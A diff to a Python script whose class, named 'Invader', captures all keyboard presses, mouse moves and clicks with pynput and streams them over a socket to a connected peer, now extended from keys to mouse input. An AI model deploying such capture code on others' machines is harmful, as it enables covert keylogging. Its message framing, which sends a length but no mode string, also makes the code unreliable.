@@ -2,13 +2,11 @@ import json
 import socket
 from pathlib import Path
 from pynput import mouse, keyboard
-import threading, queue
+import threading
 
 
 class Invader:
     def __init__(self):
-
-        self.keysQueue = queue.Queue()
         self.Stop = False
         self.conn = None
 
@@ -25,20 +23,46 @@ class Invader:
 
             self.conn, addr = s.accept()
 
-            Detect = threading.Thread(target=self.GetKey)
+            Detect = threading.Thread(target=self.GetControl)
             Detect.start()
 
-    def OnPress(self, key):
+    def SendControlKB(self, key):
+        # Send The Mod Control
+        mode = "kb".encode()
+        self.conn.sendall(len(mode).to_bytes(1, "big"))
+
+        # Send The Control
         try:
            KeyChat = key.char.encode()
-           self.conn.sendall(len(KeyChat).to_bytes(1, "big") + KeyChat)
+           self.conn.sendall(len(KeyChat).to_bytes(2, "big") + KeyChat)
         except AttributeError:
             SpKeyChat = str(key).encode()
-            self.conn.sendall(len(SpKeyChat).to_bytes(1, "big") + SpKeyChat)
+            self.conn.sendall(len(SpKeyChat).to_bytes(2, "big") + SpKeyChat)
 
-    def GetKey(self):
-        with keyboard.Listener(on_press=self.OnPress) as listener:
-            listener.join()
+    def SendMovementMouse(self, x, y):
+        # Send The Mod Control
+        mode = "pos".encode()
+        self.conn.sendall(len(mode).to_bytes(1, "big"))
+
+        # Send The Control
+        Position = f"{x}|{y}".encode()
+        self.conn.sendall(len(Position).to_bytes(2, "big") + Position)
+        
+    def SendClickMouse(self, x, y, button, pressed):
+        # Send The Mod Control
+        mode = "click".encode()
+        self.conn.sendall(len(mode).to_bytes(1, "big"))
+
+        # Send The Control
+        if pressed:
+            Click = str(button).encode()
+            self.conn.sendall(len(Click).to_bytes(2, "big") + Click)
+
+    def GetControl(self):
+        with keyboard.Listener(on_press=self.SendControlKB) as listener_kb, \
+            mouse.Listener(on_move=self.SendMovementMouse, on_click=self.SendClickMouse) as listener_mouse:
+            listener_mouse.join()
+            listener_kb.join()
 
 if __name__ == "__main__":
     I = Invader()
